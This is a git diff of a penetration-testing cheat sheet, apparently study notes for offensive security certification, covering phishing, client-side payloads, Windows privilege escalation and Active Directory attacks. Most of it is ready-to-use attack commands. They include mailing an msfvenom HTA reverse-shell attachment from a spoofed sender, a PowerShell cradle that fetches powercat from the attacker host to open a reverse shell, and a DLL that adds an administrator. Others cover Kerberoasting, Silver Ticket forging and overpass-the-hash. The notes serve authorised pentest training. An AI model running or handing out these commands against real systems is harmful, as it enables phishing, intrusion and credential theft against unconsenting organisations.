@@ -112,7 +112,7 @@ wait $(jobs -rp)
 echo "Done"
 ```
 
-And here's a one-liner to do it in windows:
+And here's a one-liner to do it in Windows:
 
 ```powershell
 # note: meant to be copy-pasted, not in .bat script (%i vs %%i)
@@ -388,7 +388,10 @@ Other ideas:
 # first create attachment and body files
 
 # then send email with swaks
-swaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server VICTIM_IP --body @body.txt --header "Subject: Need help" --suppress-data -ap
+swaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server SMTP_SERVER --body @body.txt --header "Subject: Need help" --suppress-data -ap
+
+# another option is the sendemail tool:
+sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
 ```
 
 See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
@@ -3300,7 +3303,37 @@ msf-pattern_offset -q EIP_VAL
 
 ## 3.6 Client-Side Attacks
 
-### 3.6.1 HTA Files
+### 3.6.1 Phishing Emails
+
+To send a phishing email with a malicious attachment, you can use the `swaks` tool:
+
+```sh
+# first, write a semi-convincing email body:
+vim body.txt
+
+# and create your malicious attachment
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
+
+# then send the email
+swaks -t recipient1@example.com -t recipient2@example.com --from fakesender@example.com --attach @derp.hta --server SMTP_SERVER --body @body.txt --header "Subject: Clickbait" --suppress-data -ap
+# it will prompt to input username and password if it's not an open SMTP server
+```
+
+Another option is to use the `sendemail` tool:
+
+```sh
+sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
+```
+
+A third option is to configure the Thunderbird email application to use the SMTP credentials to send your email via a GUI. When you're done, delete the profile from Thunderbird by opening the profile manager:
+
+```sh
+# open profile manager to delete old profiles
+thunderbird -p
+```
+
+
+### 3.6.2 HTA Files
 
 Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).
 
@@ -3335,7 +3368,7 @@ msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun
 ```
 
 
-### 3.6.2 Malicious Office Macros
+### 3.6.3 Malicious Office Macros
 
 You can exploit windows machines by sending a malicious Office file containing macros to the user. When they open the document, it'll execute your payload in your macro.
 
@@ -3384,7 +3417,7 @@ nc -lvnp 443
 Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.
 
 
-### 3.6.3 Windows Library Files
+### 3.6.4 Windows Library Files
 
 You can use Windows Library files to mount a pseudo-filesystem pointing to an attacker-owned WebDAV server, which hosts malicious files you want the user to execute. The benefit of this technique is that antivirus doesn't seem to scan files on your WebDAV server like it does emailed office macros.
 
@@ -3460,7 +3493,7 @@ To generate the base64 payload, I recommend using my [`mkpowercat.py`](tools/mkp
 lhost=LISTEN_IP;echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p 443 -e powershell" | iconv -t UTF-16LE | base64 | tr -d '\n';echo
 ```
 
-Insert payload and run on windows:
+Insert base64 payload and run on windows to create malicious `.lnk` file:
 
 ```powershell
 # make a custom malicious shortcut
@@ -3756,6 +3789,39 @@ driverquery | findstr Kernel
 driverquery | findstr "File System"
 ```
 
+
+### 4.1.1 Watching for Windows Process to run
+
+Yo can use WMI (CIM in PowerShell) to watch for a process to be executed:
+
+```powershell
+# Watches for a process with a given name to start running (or otherwise change)
+# reference: https://petri.com/process-monitoring-powershellGetOwner
+
+$poll = 1
+$targetName = "backup.exe" # name of process to watch for
+$logPath= "C:\Users\yoshi\Desktop\NewProcessLog.txt" # where to log hits
+$query = "Select * from CIM_InstModification within $poll where TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%$targetName%'"
+$action={
+    # log to a file
+    $date = Get-Date
+    $process = $Event.SourceEventArgs.NewEvent.SourceInstance
+    $owner = Invoke-CimMethod -InputObject $process -MethodName GetOwner
+    $logText = ""
+    $logText += "[$date] Computername = $($process.CSName)`r`n"
+    $logText += "[$date] Process = $($process.Name)`r`n"
+    $logText += "[$date] Owner = $($owner.Domain)\$($owner.User)`r`n"
+    $logText += "[$date] Command = $($process.Commandline)`r`n"
+    $logText += "[$date] PID = $($process.ProcessID)`r`n"
+    $logText += "[$date] PPID = $($process.ParentProcessID)`r`n"
+    $logText += "[$date] $('*' * 60)`r`n"
+    $logText | Out-File -FilePath $logPath -Append -Encoding ascii
+}
+Register-CimIndicationEvent -Query $query -SourceIdentifier "WatchProcess" -Action $action
+
+# to Unsubscribe:
+# Get-EventSubscriber -SourceIdentifier "WatchProcess" | Unregister-Event
+```
 
 
 ## 4.2 Windows Privilege Escalation
@@ -4178,7 +4244,7 @@ Create a malicious DLL. Here is a simple example that adds a local admin user:
 
 ```c
 // compile with:
-// x86_64-w64-mingw32-gcc derp.c --shared -o derp.dll
+// x86_64-w64-mingw32-gcc derp.c -shared -o derp.dll
 
 #include <stdlib.h>
 #include <windows.h>
@@ -4212,7 +4278,7 @@ Alternatively, you can use `msfvenom` to create a malicious DLL:
 msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1!
 ```
 
-> :warning:  **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!
+> ⚠ **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!
 
 Put the new DLL in the search path of the service executable on the victim host, then restart the service.
 
@@ -5340,7 +5406,7 @@ When you start your internal pentest, these are the first modules you should try
 
 ```sh
 # Zerologon
-crackmapexec smb DC_IP -u '' -p '' -M zerologo
+- [ ] crackmapexec smb DC_IP -u '' -p '' -M zerologon
 
 # PetitPotam
 crackmapexec smb DC_IP -u '' -p '' -M petitpotam
@@ -5361,9 +5427,10 @@ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp
 
 # PowerView for manual AD enumeration
 cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+chmod -x PowerView.ps1
 
 # SharpHound for automated AD enumeration
-cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
+wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
 
 # sysinternals suite in case you need it
 wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
@@ -5379,15 +5446,23 @@ unzip -d mimikatz mimikatz.zip
 # Rubeus.exe for AS-REP roasting, etc.
 wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
 
-# chisel for port redirection/tunneling
-echo 'DOWNLOAD chisel!'
-echo 'https://github.com/jpillora/chisel/releases'
+# windapsearch for LDAP enumeration
+wget -O windapsearch https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64
+chmod +x windapsearch
 
 # plink.exe for port redirection/tunneling
 cp /usr/share/windows-resources/binaries/plink.exe .
+chmod -x plink.exe
 
 # nc.exe for reverse/bind shells and port redirection
 cp /usr/share/windows-resources/binaries/nc.exe .
+chmod -x nc.exe
+
+# chisel for port redirection/tunneling
+/mnt/share/cheat/tools/get-chisel.sh || (
+	echo 'DOWNLOAD chisel!'
+	echo 'https://github.com/jpillora/chisel/releases'
+)
 
 # host the files on a Windows 10+ compatible SMB share
 impacket-smbserver -smb2support -user derp -password herpderp share .
@@ -5864,7 +5939,7 @@ Collecting hashes using AS-REP Roast attack:
 # push to stdout instead of file
 .\Rubeus.exe asreproast /nowrap
 
-# Kali: using crackmapexec
+# Kali: using crackmapexec, automatically finds all AS-REP Roastable users & grabs hashes
 crackmapexec ldap VICTIM -u USERNAME -p PASSWORD --asreproast asreproast.hash
 
 # Kali: use impacket (specify user info for authentication to DC)
@@ -5915,7 +5990,7 @@ Invoke-Kerberoast | fl
 # '/tgtdeleg' tries to downgrade encryption to RC4
 .\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash
 
-# Kali: use crackmapexec
+# Kali: use crackmapexec, auto-finds all kerberoastable users & grabs hashes
 crackmapexec ldap VICTIM_IP -u harry -p pass --kerberoasting kerberoast.hash
 
 # Kali: use impacket
@@ -5936,6 +6011,15 @@ If the SPN runs in the context of a computer account, a managed service account,
 
 If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.
 
+Once you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.
+
+```python
+import hashlib
+h = hashlib.new("md4", "SPN_PASSWORD".encode("utf-16le")).hexdigest()
+print(h)
+```
+
+
 
 ### 5.2.5 Silver Ticket
 
@@ -5943,7 +6027,7 @@ A Silver Ticket is a forged service ticket that an attacker uses to gain access 
 
 Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the DC. If this is enabled, the user authenticating to the service and its privileges are validated by the DC. Fortunately for this attack technique, service applications rarely perform PAC validation.
 
-That means that an attacker with the SPN password (or its NTLM hash) can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.
+That means that an attacker with the SPN password (see [Kerberoasting](#5.2.4%20Kerberoasting)) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.
 
 We need to collect the following three pieces of information to create a silver ticket:
 
@@ -5969,10 +6053,10 @@ setspn -l HOSTNAME
 # example for IIS server: HTTP/web04.corp.com:80
 ```
 
-Create silver ticket in mimikatz:
+Create silver ticket (you can use any valid username):
 
 ```powershell
-# you can use any valid username
+# in mimikatz:
 # /ptt - pass the ticket; auto-injects it into memory
 kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER
 
@@ -6124,7 +6208,7 @@ evil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD
 
 Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. Once you have the impersonated-user's TGT, you can use all the Windows tools/services that rely on Kerberos in the context of that user (e.g. PsExec)
 
-**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses.
+**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your `/etc/hosts` file).
 
 ```powershell
 # using mimikatz
@@ -6171,7 +6255,7 @@ impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
 
 # USE THIS
 # you can also do overpass-the-hash directly with one command:
-impacket-psexec -k -hashes :NTLM VICTIM_FQDN
+impacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN
 ```
 
 
@@ -6308,7 +6392,7 @@ A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup t
 # -p : store copy on disk
 vshadow.exe -nw -p  C:
 # pay attention to Shadow copy device name
-# line uner * SNAPSHOT ID = {UUID}
+# line under * SNAPSHOT ID = {UUID}
 #    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 
 # create SMB session with hacker machine
